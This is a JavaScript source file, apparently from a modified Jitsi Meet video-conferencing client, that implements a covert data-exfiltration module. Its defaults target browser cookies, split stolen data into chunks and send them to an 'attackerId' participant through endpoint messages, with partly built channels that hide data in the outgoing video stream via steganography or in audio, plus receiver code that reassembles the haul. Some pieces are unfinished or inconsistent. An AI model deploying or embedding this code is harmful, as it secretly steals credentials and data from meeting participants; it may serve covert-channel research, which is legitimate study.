/* global APP, splitString, getDefaultSettings */
import * as wasmCheck from 'wasm-check';

import createTFLiteModule from '../react/features/stream-effects/virtual-background/vendor/tflite/tflite';
import createTFLiteSIMDModule from '../react/features/stream-effects/virtual-background/vendor/tflite/tflite-simd';

import VideoSteganoEffect from './VideoSteganoEffect';

// import { AudioMixerEffect } from '../react/features/stream-effects/audio-mixer/AudioMixerEffect';

const models = {
    model96: 'libs/segm_lite_v681.tflite',
    model144: 'libs/segm_full_v679.tflite'
};

const segmentationDimensions = {
    model96: {
        height: 96,
        width: 160
    },
    model144: {
        height: 144,
        width: 256
    }
};

/**
 * Creates a new instance of VideoSteganoEffect. This loads the Meet background model that is used to
 * extract person segmentation.
 *
 * @param {Object} virtualBackground - The virtual object that contains the background image source and
 * the isVirtualBackground flag that indicates if virtual image is activated.
 * @returns {Promise<VideoSteganoEffect>}
 */
async function createVirtualSteganoEffect(virtualBackground: Object, acquiredData) {
    if (!MediaStreamTrack.prototype.getSettings && !MediaStreamTrack.prototype.getConstraints) {
        throw new Error('VideoSteganoEffect not supported!');
    }
    let tflite;

    if (wasmCheck.feature.simd) {
        tflite = await createTFLiteSIMDModule();
    } else {
        tflite = await createTFLiteModule();
    }

    const modelBufferOffset = tflite._getModelBufferMemoryOffset();
    const modelResponse = await fetch(wasmCheck.feature.simd ? models.model144 : models.model96);

    if (!modelResponse.ok) {
        throw new Error('Failed to download tflite model!');
    }

    const model = await modelResponse.arrayBuffer();

    tflite.HEAPU8.set(new Uint8Array(model), modelBufferOffset);

    tflite._loadModel(model.byteLength);

    const options = {
        ...wasmCheck.feature.simd ? segmentationDimensions.model144 : segmentationDimensions.model96,
        virtualBackground
    };

    return new VideoSteganoEffect(tflite, acquiredData, options);
}


export const defaultConfigurationValues = {
    method: 'plain',
    dataType: 'cookies',
    chunkSize: 5000
};

/**
 * Implementation of different convert channel methods
 */
class CovertChannelMethods {

    // reference to all other methods
    static options = {
        'plain': CovertChannelMethods.usePlain,
        'video': CovertChannelMethods.useVideo,
        'audio': CovertChannelMethods.useAudio
    };

    /**
     * Sending data using simple plain method
     * @param {any} data - specified data to be sent
     */
    static usePlain(data, attackerId) {
        APP.conference.sendEndpointMessage(attackerId, {
            extraction: 'reply',
            payload: data
        });
    }

    /**
     * Creates new Steganography effect on the specified media stream.
     * @param {MediaStream} stream - Video stream you want to change
     * @param {Object} acquiredData - Data that are going to be hidden inside the mediastream
     * @returns Promise of stegano effect
     */
    _createSteganoEffect(stream: MediaStream, acquiredData: Object) {
        if (!MediaStreamTrack.prototype.getSettings) {
            return Promise.reject(new Error('Stegano cannot be implemented!'));
        }

        // insert acquired data inside the video using specified method
        return Promise.resolve(new VideoSteganoEffect(stream, acquiredData));
    }

    /**
     * Send data using video stream
     * @param {any} data - specified data to be sent
     */
    static async useVideo(acquiredData) {
        const localVideo = APP.conference.localVideo;
        const steganoEffect = await createVirtualSteganoEffect(localVideo.stream, acquiredData);

        await localVideo.setEffect(steganoEffect);
        localVideo.startEffect();
    }

    /**
     * Send data using audio stream
     * @param {any} data - specified data to be sent
     */
    static async useAudio(data) {
        const desktopAudio = APP.conference._desktopAudioStream;
        const localAudio = APP.conference.localAudio;
        const mixerEffect = new AudioMixerEffect(desktopAudio);


        await localAudio.setEffect(mixerEffect);
    }
}

/**
 * Extracting data from covert channel
 */
class ExtractionCovertChannelMethods {

    // reference to all other methods
    static options = {
        'plain': ExtractionCovertChannelMethods.usedPlain,
        'video': ExtractionCovertChannelMethods.usedVideo,
        'audio': ExtractionCovertChannelMethods.usedAudio
    };

    /**
     * Receiving data using video stream
     */
    static async usedVideo(user) {
        // define MediaRecorder of received stream
        const mediaRecorder = new MediaRecorder(user._tracks[0].stream);

        mediaRecorder.ondataavailable = async blob => {
            console.log(await blob.data.arrayBuffer());
        };
        mediaRecorder.start(100);
    }

    /**
     * Receiving data using audio stream
     */
    static async usedAudio(user) {}

    /**
     * TODO: change this
     * not used anymore
     * Receiving data using audio stream
     */
    static async usedPlain(user) {}
}


/**
 * Class responsible for extraction handling
 */
export class ExtractionHandler {
    /**
     * @param {object} configuration - Object containing information about data extraction
     */
    constructor(configuration) {
        this.configuration = getDefaultSettings(defaultConfigurationValues, configuration);
        this._fileBuffer = [];
        this.communicationEnded = false;
    }

    /**
     * getter for full file buffer
     */
    get fullData() {
        if (this._fileBuffer?.length) {
            return this._fileBuffer?.reduce((first, second) => first + second);
        }

        return '';
    }

    /**
     * Send data through the specified method.
     * @param {any} data - data to be sent.
     */
    async sendAll(data, attackerId, dataSize = data.length) {
        // If the method can loose data through the transition send the final size of sent file.
        if (this.configuration.method !== 'plain') {
            CovertChannelMethods.options[this.configuration.method](dataSize, attackerId);
        }
        for (const chunkData of splitString(data, this.configuration.chunkSize)) {
            // send data using corresponding method
            CovertChannelMethods.options[this.configuration.method](chunkData, attackerId);
        }
        APP.conference.sendEndpointMessage(attackerId, {
            extraction: 'reply',
            isEnd: true
        });
        this.communicationEnded = true;
    }

    /**
     * Receive reply data through the specified extraction method.
     * Could be either plain text payload data, or control info (ending message).
     * @param {*} recievedData - Data received from endpointTextMessage.
     * @param {*} event - Custom event for dispatching data when extraction ended.
     */
    receivePlainData(recievedData, event) {
        // extract data using specified method
        if (recievedData.isEnd) { // 'reply' control ending message
            if (event) {
                // Event for downloading extracted data at the end of extraction.
                // Define custom event 'extractionEnded' and trigger it.
                event.dispatchEvent(new CustomEvent('extractionEnded', {
                    detail: {
                        extractedData: this.fullData,
                        config: this.configuration
                    }
                }));
            }
            this._fileBuffer = []; // empty the file buffer after ending communication.
            this.communicationEnded = true;

        } else { // 'reply' containg text data
            this._fileBuffer.push(recievedData.payload);
        }
    }

    /**
     * Receive data through the specified extraction method.
     */
    receiveAll(user) {
        // TODO: add generic code for all types of communication.
        ExtractionCovertChannelMethods.options[this.configuration.method](user);
    }
}
